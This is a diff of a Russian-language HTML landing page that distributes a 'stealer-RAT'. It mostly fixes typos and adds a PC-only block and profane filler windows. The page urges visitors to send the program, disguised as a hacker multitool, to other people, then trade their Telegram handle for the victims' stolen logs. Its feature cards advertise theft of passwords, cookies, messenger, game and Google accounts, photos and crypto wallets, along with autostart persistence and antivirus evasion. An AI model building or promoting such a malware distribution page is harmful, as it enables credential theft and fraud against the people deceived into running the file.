@@ -4,20 +4,28 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Скачать файл стиллера</title>
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="Files/styles.css">
 </head>
 <body>
-    <div class="container">
+    <!-- Сообщение для мобилок -->
+    <div class="mobile-block" id="mobile-block">
+        <h1>Открывай на ПК, сука!</h1>
+        <p>Этот сайт работает только на компах, никакого мобильного говна.</p>
+    </div>
+
+    <!-- Основной контент для ПК -->
+    <div class="container" id="main-content" style="display: none;">
         <!-- Окно с заголовком -->
         <div class="window" id="title-window">
             <h1 class="title">Стиллер-ратка</h1>
             <p class="description">Скачивайте программу вирус-стиллер.</p>
-            <p class="description">Отправьте недохакеру и у нас будут его данные. </p>
-            <p class="description">После ввода вашего телеграмма я вам отпишу. </p>
+            <p class="description">Отправьте недохакеру и у нас будут его данные.</p>
+            <p class="description">После ввода вашего телеграмма я вам отпишу.</p>
             <p class="description">Вы напишите мне юзак недохакера который скачал и ЗАПУСТИЛ.</p>
-            <p class="description">После ввода юзернейма я вам скину логи стмллера именно на этого недохакера. </p>
-            <p class="description">Программа скрывается под хакерский мультитул </p> 
+            <p class="description">После ввода юзернейма я вам скину логи стмллера именно на этого недохакера.</p>
+            <p class="description">Программа скрывается под хакерский мультитул</p>
         </div>
+
         <!-- Окно ввода Telegram-юзернейма -->
         <div class="window" id="input-window">
             <label for="telegram-input">Введите Telegram-юзернейм:</label>
@@ -29,7 +37,7 @@
 
         <!-- Окно выбора платформы -->
         <div class="window" id="platform-window" style="display: none;">
-            <h2>Выберите платформy</h2>
+            <h2>Выберите платформу</h2>
             <div class="platform-buttons">
                 <button class="platform-btn" data-platform="pc">PC (.exe)</button>
                 <button class="platform-btn" data-platform="android">Android (.apk)</button>
@@ -57,32 +65,32 @@
                 <div class="card">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h14v-8h3L12 2z" fill="#00ff88"/></svg>
                     <h3>Контент мессенджеров и аккаунты</h3>
-                    <p>Ворует пароли,папки,аккаунты мессенджероа.</p>
+                    <p>Ворует пароли, папки, аккаунты мессенджеров.</p>
                 </div>
                 <div class="card">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h14v-8h3L12 2z" fill="#ff0077"/></svg>
                     <h3>Авто запуск</h3>
-                    <p>Стиллер автоматически встраивается в автозапуск </p>
+                    <p>Стиллер автоматически встраивается в автозапуск.</p>
                 </div>
                 <div class="card">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h14v-8h3L12 2z" fill="#0088cc"/></svg>
                     <h3>Анти вирус Байпасс</h3>
-                    <p>Все анти вирусы не могут выявить прямой стиллер кроме virustotal</p>
+                    <p>Все анти вирусы не могут выявить прямой стиллер кроме virustotal.</p>
                 </div>
                 <div class="card">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h14v-8h3L12 2z" fill="#00ff88"/></svg>
                     <h3>Контент браузера и cookie файлы</h3>
-                    <p>Ворует куки файлы,историю браузера и т.д.</p>
+                    <p>Ворует куки файлы, историю браузера и т.д.</p>
                 </div>
                 <div class="card">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h14v-8h3L12 2z" fill="#ff0077"/></svg>
                     <h3>Ворует данные игр</h3>
-                    <p>Ворует аккаунты с популярных игр</p>
+                    <p>Ворует аккаунты с популярных игр.</p>
                 </div>
                 <div class="card">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h14v-8h3L12 2z" fill="#0088cc"/></svg>
                     <h3>Ворует аккаунты Популярных сервисов</h3>
-                    <p>Поддерживаются куча сервисов в том числе Google </p>
+                    <p>Поддерживаются куча сервисов в том числе Google.</p>
                 </div>
                 <div class="card">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h14v-8h3L12 2z" fill="#00ff88"/></svg>
@@ -92,12 +100,12 @@
                 <div class="card">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h14v-8h3L12 2z" fill="#ff0077"/></svg>
                     <h3>Ворует фото и контент из галереи</h3>
-                    <p>Запрашивает доступ к фото и галереи и ворует все что там естт.</p>
+                    <p>Запрашивает доступ к фото и галереи и ворует все что там есть.</p>
                 </div>
                 <div class="card">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h14v-8h3L12 2z" fill="#0088cc"/></svg>
                     <h3>Ворует крипто кошельки</h3>
-                    <p>Ворует крипто кошельки из браузеров,приложений и мессенджера Telegram.</p>
+                    <p>Ворует крипто кошельки из браузеров, приложений и мессенджера Telegram.</p>
                 </div>
                 <div class="card">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h14v-8h3L12 2z" fill="#00ff88"/></svg>
@@ -106,10 +114,22 @@
                 </div>
             </div>
         </div>
+
+        <!-- Дополнительное окно 1 -->
+        <div class="window" id="extra-window-1">
+            <h2>Крутая хуйня</h2>
+            <p>Ещё одно окно, чтобы было дохуя всего на экране.</p>
+        </div>
+
+        <!-- Дополнительное окно 2 -->
+        <div class="window" id="extra-window-2">
+            <h2>Ещё пиздец</h2>
+            <p>Неон, частицы, всё как ты любишь, сука!</p>
+        </div>
     </div>
 
     <canvas id="particles-canvas" style="position: absolute; top: 0; left: 0; pointer-events: none;"></canvas>
 
-    <script src="script.js"></script>
+    <script src="Files/script.js"></script>
 </body>
-</html>
+    </html>
